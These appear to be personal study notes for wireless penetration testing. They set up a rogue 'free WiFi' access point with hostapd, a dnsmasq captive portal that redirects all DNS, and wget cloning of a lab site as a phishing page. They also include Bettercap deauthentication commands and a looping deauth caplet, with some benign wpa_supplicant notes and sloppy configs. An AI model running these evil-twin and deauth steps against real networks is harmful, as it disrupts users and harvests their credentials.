The snakeoil certificates are created when the *ssl-cert* package gets installed. They shouldn't be deleted. If necessary, they can be regenerated by running
 `make-ssl-cert generate-default-snakeoil --force-overwrite`

After we will need to enable to the apache2 module

`sudo a2enmod ssl`

### Step 6: Enable Apache when done working:

```bash
sudo systemctl start apache2
```

---

Create a `hostapd.conf` file:

```ini
interface=wlan0
driver=nl80211
ssid=CoffeeShop_FreeWiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
```

Run it:

```bash
hostapd -B hostapd.conf
```

---

## After Attack Materials

---

### Using WPA-Supplicant for connections

#### üìÑ Step 1: Example `wpa_supplicant.conf` file

```bash
ctrl_interface=/run/wpa_supplicant
update_config=1
ap_scan=1
#country=us

:'

# WPA2 or WPA (Pre-Shared Key)
network={
    ssid="SecureNet"
    psk="StrongPassword123"
    key_mgmt=WPA-PSK
    priority=10
}

# WEP network with Hex key
network={
    ssid="OldWepNet"
    key_mgmt=NONE
    wep_key0=1234567890
    wep_tx_keyidx=0
    priority=5
}

# WEP network with ASCII key
network={
    ssid="AnotherWepNet"
    key_mgmt=NONE
    wep_key0="abcde"
    wep_tx_keyidx=0
    priority=4

'

}
```

#### üîç Explanation:

- `psk`: For WPA/WPA2-PSK networks.

- `key_mgmt=NONE`: Tells `wpa_supplicant` to treat this as an **open or WEP** network.

- `wep_key0`: The WEP key (use `"..."` for ASCII, no quotes for hex).

- `wep_tx_keyidx=0`: Sets which WEP key to use (default is 0).

- `priority`: Higher priority wins if multiple networks are in range.

---

#### üöÄ Step 2: Run `wpa_supplicant`

```bash
sudo wpa_supplicant -i wlan0 -c /etc/wpa_supplicant.conf -B
```

- `-i wlan0`: Your wireless interface.

- `-c`: Path to the config file.

- `-B`: Run in the background.

üí° Tip: Use `-dd` for debug output if something fails.

---

#### üåê Step 3: Get an IP Address

Once associated, you‚Äôll need to request an IP:

```bash
sudo dhclient wlan0

sudo dhcpcd wlan0
```

Or for `systemd` users:

```bash
sudo systemd-networkd
```

---

#### ‚úÖ Step 4: Verify

Check connection status:

```bash
iw wlan0 link
```

View logs:

```bash
sudo journalctl -u wpa_supplicant
```

---

#### üîê Bonus: Static IP Example (Optional)

You can skip DHCP and set a static IP manually:

```
sudo ip addr add 192.168.1.100/24 dev wlan0
sudo ip route add default via 192.168.1.1
```

---

#### üßæ Summary

| Security Type | Key Config                             |
| ------------- | -------------------------------------- |
| WPA/WPA2-PSK  | `psk="yourpass"` + `key_mgmt=WPA-PSK`  |
| WEP (ASCII)   | `key_mgmt=NONE`, `wep_key0="abcde"`    |
| WEP (Hex)     | `key_mgmt=NONE`, `wep_key0=1234567890` |

-----------------------------------------

### Manual CLI Connections:  Using `iwconfig`

```bash
sudo iwconfig wlan0 essid <NetworkName> key 1234567890 {hex key without :}
sudo dhclient wlan0
```

-----

### üßº Cleanup

```bash
airmon-ng stop wlan0mon
service NetworkManager restart
```

---

## üîç Extras for Tools

##### A. ¬†Bettercap

here are a several commands in the Wi-Fi module that will be useful
to us.

- **recon** Scan the 802.11 spectrum for APs and
  capture WPA/WPA2 handshakes.
- **deauth**:Deauthenticate clients from an AP.
- **show**:Display the discovered wireless stations.
- **ap**: Create a rogue AP.

example `wifi.recon on`

Using Tickers- 

```bash
wlan0  ¬ª set ticker.commands "clear; wifi.show"

wlan0  ¬ª wifi.recon on
...
wlan0  ¬ª ticker on

sudo bettercap -iface wlan0 -eval "set ticker.commands 
'clear; wifi.show'; wifi.recon on; ticker on"
```

Showing APs based off of a BSSID:

```bash
wlan0  ¬ª wifi.recon c6:2d:56:2a:53:f8

wlan0  ¬ª wifi.show
```

Deauth with Bettercap 

```bash
#with the use of a specific MAC address you have multiple options, you can
#deauth the AP, or you can focus on one specific client
wifi.deauth c6:2d:56:2a:53:f8
```

```bash
#Config file for Bettercap can be located and tailored 
wlan1  ¬ª wifi.recon off

 wlan1  ¬ª get wifi.handshakes.file 

  wifi.handshakes.file: '~/bettercap-wifi-handshakes.pcap'

 wlan0  ¬ª set wifi.handshakes.file "/home/kali/handshakes/"

 wlan0  ¬ª set wifi.handshakes.aggregate false

 wlan0  ¬ª wifi.recon on

 wlan0  ¬ª wifi.deauth c6:2d:56:2a:53:f8


#if there is a device that you wish not to deauth you can specify prior to attack
wlan0  ¬ª set wifi.deauth.skip ac:22:0b:28:fd:22

wlan0  ¬ª wifi.deauth c6:2d:56:2a:53:f8
```

Caplets

```bash
cat -n deauth_corp.cap 
 1  set $ {br}{fw}{net.received.human} - {env.iface.name}{reset} ¬ª {reset}
 2
 3  set ticker.period 10
 4  set ticker.commands clear; wifi.show; events.show; wifi.deauth c6:2d:56:2a:53:f8
 5
 6  events.ignore wifi.ap.new
 7  events.ignore wifi.client.probe
 8  events.ignore wifi.client.new
 9
10  wifi.recon on
11  ticker on
12  events.clear
13  clear

#start bettercap with caplet
sudo bettercap -iface wlan0 -caplet deauth_corp.cap
```

---

##### B.  Kismet

File location `/etc/kismet`

- **kismet_80211.conf** configures settings related to Wi-Fi.

- **kismet_alerts.conf** configures Kismet's intrusion detection
  and alert subsystem. 

- **kismet.conf** is the master configuration file for Kismet.

- **kismet_filter.conf** configures filtering rules for devices and
  packets.

- **kismet_httpd.conf** configures Kismet's web server.

- **kismet_logging.conf** configures how and where Kismet creates
  log files.

- **kismet_memory.conf** configures Kismet's memory usage.

- **kismet_uav.conf** contains rules for detecting unmanned aerial
  vehicles (UAV) and drones.

---

##### C. DNSMASQ

- dnsmasq is a DHCP and DNS server plugin

- Example config file 
  
  - ```bash
    # Main options
    # http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
    domain-needed
    bogus-priv
    no-resolv
    filterwin2k
    expand-hosts
    domain=localdomain
    local=/localdomain/
    # Only listen on this address. When specifying an 
    # interface, it also listens on localhost.
    # We don't want to interrupt any local resolution
    listen-address=10.0.0.1
    
    # DHCP range
    dhcp-range=10.0.2.100,10.0.0.199,12h
    dhcp-lease-max=100
    # Router: wlan0
    dhcp-option=option:router,10.0.0.1
    dhcp-authoritative
    
    # DNS: Primary and secondary Google DNS
    server=8.8.8.8
    server=8.8.4.4
    ```

`sudo dnsmasq --conf-file=dnsmasq.conf`

`dnsmasq -C dnsmasq.conf`

###### Breakdown for DNSMASQ:

- `-C` tells `dnsmasq` to use the specified config file.

- Without `-C`, it thinks `dnsmasq.conf` is a flag or malformed input, hence the ‚Äújunk found‚Äù error.

‚úÖ Additional Steps to Ensure Clean Startup

1. Kill Any Existing dnsmasq Processes

dnsmasq might already be running and occupying ports:

`sudo pkill dnsmasq`

Or:

`sudo systemctl stop dnsmasq`

2. Check for Conflicts with NetworkManager

Some systems (e.g. Ubuntu) use NetworkManager with its own dnsmasq, which may conflict.

Temporarily disable it:

`sudo systemctl stop NetworkManager`

Or edit:

`sudo nano /etc/NetworkManager/NetworkManager.conf`

Comment out or remove the line:

`dns=dnsmasq`

Then:

`sudo systemctl restart NetworkManager`

‚úÖ Basic Test to Ensure dnsmasq.conf Is Valid

You can validate the config like this:

`dnsmasq --test -C dnsmasq.conf`

If there's no error, it's safe to run.
‚úÖ Sample dnsmasq.conf (for captive portal):

`interface=wlan0
dhcp-range=192.168.50.10,192.168.50.100,12h
dhcp-option=3,192.168.50.1
dhcp-option=6,192.168.50.1
address=/#/192.168.50.1`

‚úÖ Final Launch Command

`sudo dnsmasq -C dnsmasq.conf`

---

##### D. Non-Rouge AP setup

1. Create config file. 
   
   1. ```bash
      vi host-ap.conf
      
      interface=wlan0
      ssid=BTTF
      channel=11
      
      # 802.11n
      hw_mode=g
      ieee80211n=1
      
      # WPA2 PSK with CCMP
      wpa=2
      wpa_key_mgmt=WPA-PSK
      rsn_pairwise=CCMP
      wpa_passphrase=GreatScott
      ```

`sudo hostapd hostapd.conf`

---

##### E. CURL

`curl http://192.168.1.1/example.txt`

-----------------

##### F. WGET

use something as a base for your attack [wget and save locally]
`wget -r -l2 https://www.abc123!@%^.com`

Scrape the page of a site you wish to copy

1. `wget -r -l2 https://www.megacorpone.com`
   
   1. Move these into `/var/www/html/portal` since they contain the CSS and the background image

---

##### G. Network Troubleshooting

`sudo systemctl restart NetworkManager`

`sudo /etc/init.d/networking restart`

```
ifdown eth0
ifup eth0
```
